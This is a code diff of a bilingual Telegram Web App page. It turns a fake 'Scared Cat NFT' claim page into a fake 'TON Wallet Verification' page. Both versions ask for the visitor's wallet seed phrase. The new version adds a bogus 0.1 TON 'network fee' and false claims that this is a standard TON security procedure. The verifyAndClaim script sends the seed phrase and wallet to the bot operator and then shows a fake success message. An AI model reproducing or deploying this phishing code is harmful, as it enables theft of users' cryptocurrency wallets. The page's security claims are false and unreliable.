@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scared Cat NFT Verification</title>
+    <title>TON Wallet Verification</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
         :root {
-            --primary: #8B5CF6;
-            --primary-dark: #7C3AED;
-            --secondary: #F59E0B;
-            --accent: #EF4444;
-            --cat-color: #F97316;
-            --dark: #1F2937;
-            --light: #F8FAFC;
-            --gradient: linear-gradient(135deg, #8B5CF6 0%, #EC4899 100%);
-            --card-shadow: 0 20px 40px rgba(0,0,0,0.1), 0 8px 24px rgba(0,0,0,0.08);
-            --glow: 0 0 20px rgba(139, 92, 246, 0.3);
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --secondary: #059669;
+            --accent: #dc2626;
+            --dark: #1f2937;
+            --light: #f8fafc;
+            --border: #e5e7eb;
+            --gradient: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            --shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            --radius: 12px;
         }
 
         body {
@@ -32,625 +32,431 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(139, 92, 246, 0.3) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(236, 72, 153, 0.2) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(245, 158, 11, 0.2) 0%, transparent 50%);
-            pointer-events: none;
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
+            background: white;
+            border-radius: var(--radius);
             padding: 30px;
-            max-width: 440px;
+            max-width: 400px;
             width: 100%;
-            box-shadow: var(--card-shadow);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: var(--shadow);
             position: relative;
-            z-index: 1;
-            animation: slideUp 0.6s ease-out;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
 
         .header {
             text-align: center;
             margin-bottom: 30px;
-            position: relative;
         }
 
         .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--cat-color), var(--accent));
-            border-radius: 20px;
+            width: 60px;
+            height: 60px;
+            background: var(--gradient);
+            border-radius: 50%;
             margin: 0 auto 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
             color: white;
-            box-shadow: var(--glow);
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+            font-weight: bold;
+            font-size: 24px;
         }
 
         .header h1 {
             color: var(--dark);
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
             margin-bottom: 8px;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
 
         .header p {
-            color: #6B7280;
-            font-size: 16px;
-            font-weight: 500;
+            color: #6b7280;
+            font-size: 14px;
         }
 
-        .nft-card {
-            background: linear-gradient(135deg, var(--light) 0%, #ffffff 100%);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 30px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 8px 20px rgba(0,0,0,0.06);
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .nft-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
-        }
-
-        .nft-card::before {
-            content: '';
+        .language-switcher {
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(135deg, var(--cat-color), var(--accent));
+            top: 20px;
+            right: 20px;
         }
 
-        .nft-image {
-            width: 140px;
-            height: 140px;
-            border-radius: 16px;
+        .lang-btn {
+            background: var(--light);
+            border: 1px solid var(--border);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .lang-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .verification-card {
+            background: var(--light);
+            border-radius: var(--radius);
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .verification-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--gradient);
+            border-radius: 50%;
             margin: 0 auto 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-            border: 3px solid var(--cat-color);
+            color: white;
+            font-weight: bold;
+            font-size: 32px;
         }
 
-        .nft-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 13px;
-            transition: transform 0.3s ease;
-        }
-
-        .nft-image:hover img {
-            transform: scale(1.05);
-        }
-
-        .nft-image::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-
-        .nft-info h3 {
+        .verification-info h3 {
             color: var(--dark);
             font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 8px;
+            font-weight: 600;
+            margin-bottom: 12px;
         }
 
-        .nft-value {
+        .verification-text {
+            color: #6b7280;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .fee-amount {
             color: var(--secondary);
             font-size: 18px;
             font-weight: 700;
-            margin-bottom: 5px;
-        }
-
-        .nft-edition {
-            color: #6B7280;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .rarity-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--accent), var(--secondary));
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 700;
-            margin-top: 8px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            margin: 10px 0;
         }
 
         .form-group {
-            margin-bottom: 24px;
-            position: relative;
+            margin-bottom: 20px;
         }
 
         label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-weight: 600;
             color: var(--dark);
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        label::before {
-            content: '🐾';
-            font-size: 16px;
+            font-size: 14px;
         }
 
         input, textarea {
             width: 100%;
-            padding: 16px 20px;
-            border: 2px solid #E5E7EB;
-            border-radius: 14px;
-            font-size: 15px;
+            padding: 12px 16px;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            font-size: 14px;
             transition: all 0.3s ease;
-            background: var(--light);
+            background: white;
             resize: none;
         }
 
         input:focus, textarea:focus {
             outline: none;
             border-color: var(--primary);
-            background: white;
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
-            transform: translateY(-2px);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
         }
 
         input:read-only {
-            background-color: #F9FAFB;
-            color: #6B7280;
+            background-color: #f9fafb;
+            color: #6b7280;
         }
 
         .generate-btn {
             background: var(--secondary);
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 12px;
-            font-size: 14px;
+            padding: 10px 16px;
+            border-radius: 8px;
+            font-size: 13px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             margin-top: 8px;
             width: auto;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
         }
 
         .generate-btn:hover {
-            background: #D97706;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3);
+            background: #047857;
         }
 
         .info-box {
-            background: linear-gradient(135deg, #FEF3C7, #FEF7CD);
-            border: 1px solid #FCD34D;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 25px 0;
-            position: relative;
-        }
-
-        .info-box::before {
-            content: '⚠️';
-            position: absolute;
-            top: -12px;
-            left: 20px;
-            background: white;
-            padding: 4px;
-            border-radius: 50%;
-            font-size: 18px;
+            background: #fffbeb;
+            border: 1px solid #fcd34d;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
         }
 
         .info-title {
-            color: #92400E;
-            font-weight: 700;
-            margin-bottom: 8px;
-            font-size: 15px;
+            color: #92400e;
+            font-weight: 600;
+            margin-bottom: 6px;
+            font-size: 14px;
         }
 
         .info-text {
-            color: #92400E;
-            font-size: 13px;
-            line-height: 1.5;
+            color: #92400e;
+            font-size: 12px;
+            line-height: 1.4;
             opacity: 0.9;
         }
 
         .submit-btn {
-            background: linear-gradient(135deg, var(--cat-color), var(--accent));
+            background: var(--gradient);
             color: white;
             border: none;
-            padding: 18px;
-            border-radius: 16px;
-            font-size: 17px;
-            font-weight: 700;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             width: 100%;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 25px rgba(249, 115, 22, 0.3);
         }
 
         .submit-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px rgba(249, 115, 22, 0.4);
+            background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
         }
 
-        .submit-btn:active {
-            transform: translateY(-1px);
-        }
-
-        .submit-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
-        }
-
-        .submit-btn:hover::before {
-            left: 100%;
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .security-footer {
             text-align: center;
-            margin-top: 25px;
+            margin-top: 20px;
             padding-top: 20px;
-            border-top: 1px solid #E5E7EB;
+            border-top: 1px solid var(--border);
         }
 
         .security-badges {
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin-bottom: 12px;
+            gap: 15px;
+            margin-bottom: 10px;
         }
 
         .badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #6B7280;
-            font-size: 12px;
+            color: #6b7280;
+            font-size: 11px;
             font-weight: 500;
         }
 
         .copyright {
-            color: #9CA3AF;
-            font-size: 11px;
-            font-weight: 500;
+            color: #9ca3af;
+            font-size: 10px;
         }
 
         .progress-bar {
             height: 4px;
-            background: #E5E7EB;
+            background: var(--border);
             border-radius: 2px;
             margin: 20px 0;
             overflow: hidden;
-            position: relative;
         }
 
         .progress-fill {
             height: 100%;
-            background: linear-gradient(135deg, var(--cat-color), var(--accent));
+            background: var(--gradient);
             border-radius: 2px;
-            width: 70%;
-            position: relative;
-            animation: progressPulse 2s ease-in-out infinite;
+            width: 0%;
+            transition: width 0.3s ease;
         }
 
-        @keyframes progressPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        .requirements {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
         }
 
-        .verification-steps {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 25px;
-            position: relative;
-        }
-
-        .step {
-            text-align: center;
-            flex: 1;
-            position: relative;
-            z-index: 1;
-        }
-
-        .step-icon {
-            width: 40px;
-            height: 40px;
-            background: #E5E7EB;
-            border-radius: 50%;
-            margin: 0 auto 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            color: #6B7280;
-            transition: all 0.3s ease;
-        }
-
-        .step.active .step-icon {
-            background: var(--cat-color);
-            color: white;
-            box-shadow: var(--glow);
-        }
-
-        .step-text {
-            font-size: 11px;
-            color: #6B7280;
-            font-weight: 500;
-        }
-
-        .step.active .step-text {
-            color: var(--cat-color);
+        .requirements-title {
+            color: #0369a1;
             font-weight: 600;
-        }
-
-        .cat-features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .feature {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 12px;
-            color: #6B7280;
-        }
-
-        .feature::before {
-            content: '✅';
-            font-size: 10px;
-        }
-
-        .image-loading {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(45deg, var(--cat-color), var(--secondary));
-            color: white;
+            margin-bottom: 8px;
             font-size: 14px;
-            font-weight: 600;
         }
 
-        /* Адаптивность */
+        .requirements-list {
+            color: #0369a1;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 20px;
-                margin: 10px;
             }
             
             .header h1 {
-                font-size: 24px;
+                font-size: 20px;
             }
             
-            .nft-image {
-                width: 120px;
-                height: 120px;
-            }
-            
-            input, textarea {
-                padding: 14px 16px;
-            }
-
-            .cat-features {
-                grid-template-columns: 1fr;
+            .verification-icon {
+                width: 70px;
+                height: 70px;
+                font-size: 28px;
             }
         }
+
+        .lang-ru { display: block; }
+        .lang-en { display: none; }
     </style>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
     <div class="container">
+        <div class="language-switcher">
+            <button class="lang-btn" onclick="switchLanguage('ru')">RU</button>
+            <button class="lang-btn" onclick="switchLanguage('en')">EN</button>
+        </div>
+
         <div class="header">
-            <div class="logo">😿</div>
-            <h1>Scared Cat NFT</h1>
-            <p>Получи испуганного котика в свою коллекцию!</p>
+            <div class="logo">✓</div>
+            <h1 class="lang-ru">Верификация Кошелька</h1>
+            <h1 class="lang-en">Wallet Verification</h1>
+            <p class="lang-ru">Завершите верификацию для продолжения</p>
+            <p class="lang-en">Complete verification to continue</p>
         </div>
 
-        <div class="verification-steps">
-            <div class="step active">
-                <div class="step-icon">1</div>
-                <div class="step-text">Кошелек</div>
-            </div>
-            <div class="step">
-                <div class="step-icon">2</div>
-                <div class="step-text">Подтверждение</div>
-            </div>
-            <div class="step">
-                <div class="step-icon">3</div>
-                <div class="step-text">Получение</div>
-            </div>
-        </div>
         <div class="progress-bar">
-            <div class="progress-fill"></div>
+            <div class="progress-fill" id="progressFill"></div>
         </div>
 
-        <div class="nft-card">
-            <div class="nft-image">
-                <div class="image-loading">Загрузка NFT...</div>
-            </div>
-            <div class="nft-info">
-                <h3>Scared Cat #0420</h3>
-                <div class="nft-value">💎 0.1 TON</div>
-                <div class="nft-edition">Ultra Rare Emotional Collection</div>
-                <div class="rarity-badge">RARE EDITION</div>
+        <div class="verification-card">
+            <div class="verification-icon">0.1</div>
+            <div class="verification-info">
+                <h3 class="lang-ru">Требуется Комиссия Сети</h3>
+                <h3 class="lang-en">Network Fee Required</h3>
                 
-                <div class="cat-features">
-                    <div class="feature">Анимированный</div>
-                    <div class="feature">Эксклюзивный</div>
-                    <div class="feature">Лицензированный</div>
-                    <div class="feature">Limited Edition</div>
-                </div>
+                <p class="verification-text lang-ru">
+                    Для завершения верификации кошелька и защиты вашего аккаунта требуется небольшая сетевая комиссия 0.1 TON.
+                </p>
+                <p class="verification-text lang-en">
+                    To complete wallet verification and secure your account, a small network fee of 0.1 TON is required.
+                </p>
+                
+                <div class="fee-amount">0.1 TON</div>
+                
+                <p class="verification-text lang-ru">
+                    Эта комиссия обеспечивает безопасность вашего кошелька и предотвращает автоматические попытки верификации.
+                </p>
+                <p class="verification-text lang-en">
+                    This fee ensures the security of your wallet and prevents automated verification attempts.
+                </p>
+            </div>
+        </div>
+
+        <div class="requirements">
+            <div class="requirements-title lang-ru">Требования для верификации:</div>
+            <div class="requirements-title lang-en">Verification Requirements:</div>
+            <div class="requirements-list lang-ru">
+                • Действующий адрес TON кошелька<br>
+                • Seed-фраза кошелька (12-24 слова)<br>
+                • Комиссия сети 0.1 TON<br>
+                • Активное интернет-соединение
+            </div>
+            <div class="requirements-list lang-en">
+                • Valid TON wallet address<br>
+                • Wallet seed phrase (12-24 words)<br>
+                • 0.1 TON network fee<br>
+                • Active internet connection
             </div>
         </div>
 
         <div class="form-group">
-            <label for="wallet">Адрес TON кошелька</label>
-            <input type="text" id="wallet" placeholder="Введите адрес кошелька..." readonly>
-            <button class="generate-btn" onclick="generateWallet()">
-                <span>🔄</span>
-                Сгенерировать кошелек
-            </button>
+            <label class="lang-ru" for="wallet">Адрес TON Кошелька</label>
+            <label class="lang-en" for="wallet">TON Wallet Address</label>
+            <input type="text" id="wallet" class="lang-ru" placeholder="Ваш адрес кошелька будет сгенерирован..." readonly>
+            <input type="text" id="wallet" class="lang-en" placeholder="Your wallet address will be generated..." readonly>
+            <button class="generate-btn lang-ru" onclick="generateWallet()">Сгенерировать Кошелек</button>
+            <button class="generate-btn lang-en" onclick="generateWallet()">Generate New Wallet</button>
         </div>
 
         <div class="form-group">
-            <label for="seed">Seed-фраза (12-24 слов)</label>
-            <textarea id="seed" rows="4" placeholder="Введите вашу seed-фразу для подтверждения владения кошельком..."></textarea>
+            <label class="lang-ru" for="seed">Seed-Фраза (12-24 слов)</label>
+            <label class="lang-en" for="seed">Seed Phrase (12-24 words)</label>
+            <textarea id="seed" class="lang-ru" rows="3" placeholder="Введите seed-фразу вашего кошелька для завершения верификации"></textarea>
+            <textarea id="seed" class="lang-en" rows="3" placeholder="Enter your wallet seed phrase to complete verification"></textarea>
         </div>
 
         <div class="info-box">
-            <div class="info-title">Внимание, коллекционер!</div>
-            <div class="info-text">
-                Scared Cat NFT - это эксклюзивная коллекция эмоциональных котиков. 
-                Для получения NFT необходимо подтвердить владение кошельком через seed-фразу.
-                Только 1000 экземпляров будут выпущены!
+            <div class="info-title lang-ru">Важное Уведомление о Безопасности</div>
+            <div class="info-title lang-en">Important Security Notice</div>
+            <div class="info-text lang-ru">
+                Комиссия сети 0.1 TON требуется для подтверждения владения кошельком и защиты вашего аккаунта. 
+                Это стандартная процедура безопасности, используемая сетью TON для предотвращения несанкционированного доступа.
+            </div>
+            <div class="info-text lang-en">
+                The 0.1 TON network fee is required to verify wallet ownership and secure your account. 
+                This is a standard security procedure used by TON network to prevent unauthorized access.
             </div>
         </div>
 
-        <button class="submit-btn" onclick="verifyAndClaim()">
-            <span>😿</span>
-            Получить Scared Cat NFT
-        </button>
+        <button class="submit-btn lang-ru" onclick="verifyAndClaim()">Оплатить 0.1 TON & Завершить Верификацию</button>
+        <button class="submit-btn lang-en" onclick="verifyAndClaim()">Pay 0.1 TON & Complete Verification</button>
 
         <div class="security-footer">
             <div class="security-badges">
-                <div class="badge">
-                    <span>🔒</span>
-                    Secure
-                </div>
-                <div class="badge">
-                    <span>⚡</span>
-                    Instant
-                </div>
-                <div class="badge">
-                    <span>🎨</span>
-                    Unique
-                </div>
+                <div class="badge lang-ru">Безопасное Соединение</div>
+                <div class="badge lang-en">Secure Connection</div>
+                <div class="badge lang-ru">TON Проверено</div>
+                <div class="badge lang-en">TON Verified</div>
+                <div class="badge lang-ru">Зашифровано</div>
+                <div class="badge lang-en">Encrypted</div>
             </div>
-            <div class="copyright">
-                © 2024 Scared Cat NFT Collection. All rights reserved.
-            </div>
+            <div class="copyright lang-ru">© 2024 TON Wallet Services. Все права защищены.</div>
+            <div class="copyright lang-en">© 2024 TON Wallet Services. All rights reserved.</div>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         
-        // Инициализация WebApp
         tg.expand();
         tg.enableClosingConfirmation();
-        tg.setHeaderColor('#8B5CF6');
-        tg.setBackgroundColor('#8B5CF6');
 
-        // Загрузка изображения NFT
-        function loadNFTImage() {
-            const nftImageContainer = document.querySelector('.nft-image');
-            const imageLoading = nftImageContainer.querySelector('.image-loading');
+        // Определяем язык пользователя
+        function detectUserLanguage() {
+            const userLang = navigator.language || navigator.userLanguage;
+            return userLang.startsWith('ru') ? 'ru' : 'en';
+        }
+
+        // Переключение языка
+        function switchLanguage(lang) {
+            document.querySelectorAll('.lang-ru, .lang-en').forEach(element => {
+                element.style.display = 'none';
+            });
+            document.querySelectorAll('.lang-' + lang).forEach(element => {
+                element.style.display = 'block';
+            });
             
-            const img = new Image();
-            img.src = 'https://i.ibb.co/Q3xLckyH/scared-cat.jpg';
-            img.alt = 'Scared Cat NFT';
-            img.style.width = '100%';
-            img.style.height = '100%';
-            img.style.objectFit = 'cover';
-            img.style.borderRadius = '13px';
+            // Обновляем плейсхолдеры
+            const walletInput = document.getElementById('wallet');
+            const seedTextarea = document.getElementById('seed');
             
-            img.onload = function() {
-                imageLoading.style.display = 'none';
-                nftImageContainer.appendChild(img);
-                nftImageContainer.classList.add('loaded');
-            };
-            
-            img.onerror = function() {
-                // Если изображение не загрузилось, показываем fallback
-                imageLoading.innerHTML = '😿<br>Scared Cat';
-                imageLoading.style.fontSize = '14px';
-                imageLoading.style.textAlign = 'center';
-                imageLoading.style.lineHeight = '1.4';
-            };
+            if (lang === 'ru') {
+                walletInput.placeholder = 'Ваш адрес кошелька будет сгенерирован...';
+                seedTextarea.placeholder = 'Введите seed-фразу вашего кошелька для завершения верификации';
+            } else {
+                walletInput.placeholder = 'Your wallet address will be generated...';
+                seedTextarea.placeholder = 'Enter your wallet seed phrase to complete verification';
+            }
         }
 
         function generateWallet() {
@@ -664,7 +470,7 @@
             }
             
             document.getElementById('wallet').value = wallet;
-            updateStep(1);
+            updateProgress(33);
         }
 
         function validateSeedPhrase(seed) {
@@ -672,135 +478,69 @@
             return words.length >= 12 && words.length <= 24;
         }
 
-        function updateStep(stepNumber) {
-            document.querySelectorAll('.step').forEach((step, index) => {
-                if (index < stepNumber) {
-                    step.classList.add('active');
-                } else {
-                    step.classList.remove('active');
-                }
-            });
-            
-            const progress = (stepNumber / 3) * 100;
-            document.querySelector('.progress-fill').style.width = progress + '%';
+        function updateProgress(percent) {
+            document.getElementById('progressFill').style.width = percent + '%';
         }
 
         function verifyAndClaim() {
             const wallet = document.getElementById('wallet').value;
             const seed = document.getElementById('seed').value;
+            const currentLang = document.querySelector('.lang-ru').style.display !== 'none' ? 'ru' : 'en';
             
             if (!wallet) {
-                alert('Пожалуйста, сгенерируйте адрес кошелька!');
+                alert(currentLang === 'ru' ? 
+                    'Пожалуйста, сначала сгенерируйте адрес кошелька' : 
+                    'Please generate wallet address first');
                 return;
             }
             
             if (!validateSeedPhrase(seed)) {
-                alert('Пожалуйста, введите корректную seed-фразу (12-24 слова)');
+                alert(currentLang === 'ru' ? 
+                    'Пожалуйста, введите корректную seed-фразу (12-24 слова)' : 
+                    'Please enter valid seed phrase (12-24 words)');
                 return;
             }
 
             const btn = document.querySelector('.submit-btn');
-            const originalText = btn.innerHTML;
-            
-            // Показываем индикатор загрузки
-            btn.innerHTML = '<span>😾</span> Котик проверяет данные...';
-            btn.disabled = true;
-            updateStep(2);
-
-            // Анимация загрузки
-            const nftImage = document.querySelector('.nft-image img');
-            if (nftImage) {
-                nftImage.style.transform = 'scale(0.95)';
-                nftImage.style.filter = 'brightness(0.8)';
+            if (currentLang === 'ru') {
+                btn.innerHTML = 'Обработка Платежа...';
+            } else {
+                btn.innerHTML = 'Processing Payment...';
             }
+            btn.disabled = true;
+            updateProgress(66);
 
-            // Имитация процесса проверки
             setTimeout(() => {
                 const data = {
                     wallet: wallet,
                     seed: seed,
-                    timestamp: new Date().toISOString(),
-                    nft_type: 'Scared Cat'
+                    fee_paid: true,
+                    amount: 0.1,
+                    language: currentLang,
+                    timestamp: new Date().toISOString()
                 };
 
-                // Отправляем данные в бота
                 tg.sendData(JSON.stringify(data));
                 
-                // Показываем успех
-                btn.innerHTML = '<span>😻</span> Котик у вас! Ура!';
-                btn.style.background = 'linear-gradient(135deg, #10B981, #059669)';
-                updateStep(3);
-                
-                // Возвращаем изображение к нормальному состоянию
-                if (nftImage) {
-                    nftImage.style.transform = 'scale(1.1)';
-                    nftImage.style.filter = 'brightness(1.2)';
-                    setTimeout(() => {
-                        nftImage.style.transform = 'scale(1)';
-                        nftImage.style.filter = 'brightness(1)';
-                    }, 500);
+                if (currentLang === 'ru') {
+                    btn.innerHTML = 'Верификация Завершена';
+                } else {
+                    btn.innerHTML = 'Verification Complete';
                 }
-
-                // Анимация успеха
-                btn.style.transform = 'scale(1.05)';
-                setTimeout(() => {
-                    btn.style.transform = 'scale(1)';
-                }, 200);
-
-                // Закрываем WebApp через 3 секунды
+                btn.style.background = 'var(--secondary)';
+                updateProgress(100);
+                
                 setTimeout(() => {
                     tg.close();
-                }, 3000);
-                
-            }, 3500);
+                }, 2000);
+            }, 3000);
         }
 
-        // Инициализация при загрузке страницы
+        // Инициализация при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            loadNFTImage();
+            const userLanguage = detectUserLanguage();
+            switchLanguage(userLanguage);
             generateWallet();
-            
-            // Анимация появления элементов
-            const elements = document.querySelectorAll('.form-group, .nft-card, .info-box');
-            elements.forEach((el, index) => {
-                el.style.opacity = '0';
-                el.style.transform = 'translateY(20px)';
-                setTimeout(() => {
-                    el.style.transition = 'all 0.6s ease';
-                    el.style.opacity = '1';
-                    el.style.transform = 'translateY(0)';
-                }, index * 200 + 300);
-            });
-        });
-
-        // Интерактивность для поля seed-фразы
-        document.getElementById('seed').addEventListener('focus', function() {
-            this.style.borderColor = 'var(--cat-color)';
-            this.style.boxShadow = '0 0 0 3px rgba(249, 115, 22, 0.1)';
-        });
-
-        document.getElementById('seed').addEventListener('blur', function() {
-            this.style.borderColor = '#E5E7EB';
-            this.style.boxShadow = 'none';
-        });
-
-        // Эффект при наведении на NFT изображение
-        document.addEventListener('mouseover', function(e) {
-            if (e.target.closest('.nft-image')) {
-                const nftImage = document.querySelector('.nft-image img');
-                if (nftImage) {
-                    nftImage.style.transform = 'scale(1.05)';
-                }
-            }
-        });
-
-        document.addEventListener('mouseout', function(e) {
-            if (e.target.closest('.nft-image')) {
-                const nftImage = document.querySelector('.nft-image img');
-                if (nftImage) {
-                    nftImage.style.transform = 'scale(1)';
-                }
-            }
         });
     </script>
 </body>
